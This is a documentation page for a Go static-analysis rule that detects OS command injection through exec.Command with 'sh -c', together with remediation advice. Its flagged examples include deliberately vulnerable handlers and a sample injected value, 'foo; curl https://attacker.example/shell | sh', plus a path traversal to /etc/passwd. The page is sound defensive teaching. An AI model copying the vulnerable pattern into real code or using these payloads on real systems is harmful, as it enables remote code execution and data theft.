---
title: "VNX-GO-002 – Command Injection via exec.Command"
description: "Reports exec.Command/CommandContext running a shell with -c (or /C, -Command) and a script built with fmt.Sprintf or concatenation, or read from the HTTP request, and a program name that is itself formatted or request-supplied. Constant scripts, positional parameters, shell-quoted values and formatted arguments to a fixed program are not reported."
---

## Overview

This rule detects calls to `exec.Command` on the same line as `fmt.Sprintf`, which is a strong signal that a shell command string is being constructed from dynamic input and then executed. When any portion of the formatted string originates from user input — a query parameter, form field, environment variable, or file content — an attacker can inject arbitrary operating system commands. This vulnerability is classified as [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html).

**Severity:** High | **CWE:** [CWE-78 – OS Command Injection](https://cwe.mitre.org/data/definitions/78.html) | **OWASP ASVS:** [V5.2 – Sanitization and Sandboxing](https://owasp.org/www-project-application-security-verification-standard/)

> **Go idiom note:** Passing arguments as separate parameters to `exec.Command` IS the idiomatic Go default. The `os/exec` package was designed to avoid shell invocation entirely — using `fmt.Sprintf` to construct a combined command string is an anti-pattern that goes against the package's design. The secure approach is also the natural one.

## Why This Matters

OS command injection gives an attacker direct access to the host operating system under the same privileges as the running process. In a cloud or container environment that typically means the ability to read secrets from environment variables or mounted volumes, exfiltrate data, install backdoors, move laterally to other services on the same network, or destroy data. Unlike SQL injection, which is constrained to the database, command injection exposes the entire host. The risk is amplified in Go services that accept external input (web handlers, gRPC services, CLIs) because Go programs often run with elevated container or system privileges.

OWASP ASVS v4.0 requirement **V5.2.2** requires that unstructured data be sanitized to enforce safety measures such as allowed characters and length. For OS command construction, the only reliable enforcement is to never construct a shell string at all.

## What Gets Flagged

The rule fires when `exec.Command` or `exec.CommandContext` starts a shell (`sh`, `bash`, `zsh`, `cmd`, `powershell`, `pwsh`...) with `-c`, `/C` or `-Command` and the script is built with `fmt.Sprintf` or `+`, read from the request, or held in a variable assigned from one of those a few lines up. A call broken over several lines is read as one. It also fires when the program name itself is formatted or request-supplied. A formatted value passed as its own argument to a fixed program (`exec.Command("git", "log", fmt.Sprintf(...))`) is not reported: no shell parses it. Nor is a value passed as a positional parameter (`sh -c 'grep "$1" f' sh value`) or quoted with `shellescape.Quote`.

```go
// FLAGGED: concatenated script
cmd := exec.Command("sh", "-c", "ping -c 2 "+endpoint)
```

```go
// FLAGGED: user input folded into a shell command via fmt.Sprintf
func runReport(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("filename")
    cmd := exec.Command("sh", "-c", fmt.Sprintf("cat /reports/%s", name))
    out, _ := cmd.Output()
    w.Write(out)
}
// An attacker passes filename=../../etc/passwd or
// filename=foo; curl https://attacker.example/shell | sh
```

## Remediation

1. **Pass arguments as separate parameters to `exec.Command`.** Go's `exec.Command` deliberately separates the executable from its arguments. This completely prevents shell interpretation — no shell is invoked, so metacharacters like `;`, `|`, `&&`, `$()` are treated as literals.

```go
// SAFE: arguments are separate; no shell interpolation occurs
func runReport(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("filename")
    cmd := exec.Command("cat", "/reports/"+name)
    out, err := cmd.Output()
    if err != nil {
        http.Error(w, "report unavailable", http.StatusInternalServerError)
        return
    }
    w.Write(out)
}
```

2. **Validate input against an allowlist before use.** Even with separate arguments, a path traversal attack is still possible (`../../etc/passwd`). Validate the filename against an allowlist of permitted values, or use `filepath.Clean` combined with a base directory check.

```go
import (
    "path/filepath"
    "strings"
)

func safeReportPath(name string) (string, error) {
    base := "/reports"
    clean := filepath.Clean(filepath.Join(base, name))
    if !strings.HasPrefix(clean, base+string(filepath.Separator)) {
        return "", fmt.Errorf("invalid report name")
    }
    return clean, nil
}
```

3. **Avoid `sh -c` entirely.** Never pass a dynamically constructed string to a shell (`sh -c`, `bash -c`, `cmd /C`). If you need shell features like pipes, implement them natively in Go using `io.Pipe` and multiple `exec.Command` calls connected together.

4. **Consider `exec.LookPath` for explicit binary resolution.** When the executable itself could be influenced by input, use `exec.LookPath` to resolve the binary to an absolute path before executing it.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Application Security Verification Standard v4.0 – V5.2 Sanitization and Sandboxing](https://owasp.org/www-project-application-security-verification-standard/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Go Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Go_Security_Cheat_Sheet.html)
- [Go os/exec package documentation](https://pkg.go.dev/os/exec)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
